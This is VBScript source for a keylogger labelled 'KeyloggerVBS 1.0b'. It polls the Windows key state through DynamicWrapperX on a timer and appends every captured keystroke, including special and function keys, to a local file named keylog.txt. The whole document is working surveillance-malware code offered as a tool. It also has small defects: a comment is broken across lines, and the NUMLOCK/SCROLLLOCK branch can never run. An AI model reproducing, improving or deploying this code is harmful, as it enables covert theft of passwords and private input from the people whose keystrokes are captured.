'****************************************************
'* KeyloggerVBS 1.0b no oem keys support
'* omen999 december 2009
'****************************************************
Option Explicit
Const Pressed = -32767
Const ForAppending = 8
Dim oWrap, pAddr, pRef, uIDEvent
Dim bLoop, Fso, oKeyLog
Dim aSysKey(35)
aSysKey(0)="{BACKSPACE}"
aSysKey(1)="{TAB}"
aSysKey(2)="{RETURN}"
aSysKey(3)="{BREAK}"
aSysKey(4)="{NUMLOCK}"
aSysKey(5)="{SCROLLLOCK}"
aSysKey(6)="{CAPSLOCK}"
aSysKey(7)="{ESC}"
aSysKey(8)="{PGUP}"
aSysKey(9)="{PGDN}"
aSysKey(10)="{END}"
aSysKey(11)="{HOME}"
aSysKey(12)="{LEFT}"
aSysKey(13)="{UP}"
aSysKey(14)="{RIGHT}"
aSysKey(15)="{DOWN}"
aSysKey(16)="{PRTSC}"
aSysKey(17)="{INS}"
aSysKey(18)="{DEL}"
aSysKey(19)="{HELP}"
aSysKey(20)="{F1}"
aSysKey(21)="{F2}"
aSysKey(22)="{F3}"
aSysKey(23)="{F4}"
aSysKey(24)="{F5}"
aSysKey(25)="{F6}"
aSysKey(26)="{F7}"
aSysKey(27)="{F8}"
aSysKey(28)="{F9}"
aSysKey(29)="{F10}"
aSysKey(30)="{F11}"
aSysKey(31)="{F12}"
aSysKey(32)="{F13}"
aSysKey(33)="{F14}"
aSysKey(34)="{F15}"
aSysKey(35)="{F16}"

Private Function GetCapsLock()
GetCapsLock = CBool(oWrap.GetKeyState(&H14))
End Function
Private Function GetNumLock()
GetNumLock = CBool(oWrap.GetKeyState(&H90))
End Function
Private Function GetShift()
GetShift = CBool(oWrap.GetAsyncKeyState(&H10))
End Function

Sub TimerProc(hWnd, uMsg, idEvent, dwTime)
Dim i
Dim cKey
cKey = ""
For i = &H8 to &H7F
Select Case i
Case &HA,&HB,&HC,&HE,&HF,&H10,&H11,&H12,&H14,&H15,&H16,&H17,&H18,&H19,&H1A,&H1C,&H1D,&H1E,&H1F,&H29,&H2A,&H2B,&H3A,&H3B,&H3C,&H3D,&H3E,&H3F,&H40,&H5B,&H5C,&H5D,&H5E,&H5F
' NOPARSED KEYS
Case &H8,&H9 ' BACKSPACE TAB
If oWrap.GetAsyncKeyState(i) = Pressed Then
cKey = aSysKey(i - &H8)
Exit For
End If
Case &HD ' RETURN
If oWrap.GetAsyncKeyState(i) = Pressed Then
cKey = aSysKey(i - &HB)
Exit For
End If
Case &H13 ' PAUSE
If oWrap.GetAsyncKeyState(i) = Pressed Then
cKey = aSysKey(i - &H10)
Exit For
End If
Case &H1B ' ESC
If oWrap.GetAsyncKeyState(i) = Pressed Then
cKey = aSysKey(i - &H14)
Exit For
End If
Case &H21,&H22,&H23,&H24,&H25,&H26,&H27,&H28 ' ARROW KEYS
If oWrap.GetAsyncKeyState(i) = Pressed Then
cKey = aSysKey(i - &H19)
Exit For
End If
Case &H2C,&H2D,&H2E,&H2F ' PRTSC INS DEL HELP
If oWrap.GetAsyncKeyState(i) = Pressed Then
cKey = aSysKey(i - &H1C)
Exit For
End If
Case &H70,&H71,&H72,&H73,&H74,&H75,&H76,&H77,&H78,&H79,&H7A,&H7B,&H7C,&H7D,&H7E,&H7F
' FUNC KEYS
If oWrap.GetAsyncKeyState(i) = Pressed Then
cKey = aSysKey(i - &H5C)
Exit For
End If
Case &H90,&H91 ' NUMLOCK, SCROLLLOCK
If oWrap.GetAsyncKeyState(i) = Pressed Then
cKey = aSysKey(i - &H8C)
Exit For
End If
Case &H60,&H61,&H62,&H63,&H64,&H65,&H66,&H67,&H68,&H69 ' NUMERIC
PAD KEYS
If oWrap.GetAsyncKeyState(i) = Pressed Then
If GetNumLock Then cKey = Chr(i - &H30) ' NUMLOCK ONLY
Exit For
End If
Case &H6A,&H6B,&H6C,&H6D,&H6E,&H6F ' MATH KEYS
If oWrap.GetAsyncKeyState(i) = Pressed Then
cKey = Chr(i - &H40)
Exit For
End If
Case Else ' ALPHANUMERIC KEYS
If oWrap.GetAsyncKeyState(i) = Pressed Then
If GetCapsLock Then
If GetShift Then cKey = LCase(Chr(i)) Else cKey = UCase(Chr(i))
Else If GetShift Then cKey = UCase(Chr(i)) Else cKey = LCase(Chr(i))
End If
Exit For
End If
End Select
Next
If cKey <> "" Then oKeyLog.Write cKey
End Sub
Set oWrap = CreateObject("DynamicWrapperX")
Set pRef = GetRef("TimerProc")
Set Fso = CreateObject("Scripting.FileSystemObject")
With oWrap
.Register "user32.dll", "SetTimer", "i=llll", "r=l"
.Register "user32.dll", "KillTimer", "i=ll", "r=l"
.Register "user32.dll", "GetAsyncKeyState", "i=l", "r=n"
.Register "user32.dll", "GetKeyState", "i=l", "r=n"
End With
Set oKeyLog = Fso.OpenTextFile("keylog.txt", ForAppending, True)
pAddr = oWrap.RegisterCallback(pRef, "i=llll", "r=l")
uIDEvent = oWrap.SetTimer(0, 0, 50, pAddr)
bLoop=True
While bLoop
	WScript.Sleep 80
	' Loop exit Shift + Esc
	If (oWrap.GetAsyncKeyState(&H1B) = Pressed) and GetShift Then
		bLoop=False
	End If
Wend
oWrap.KillTimer 0,uIDEvent
oKeyLog.Close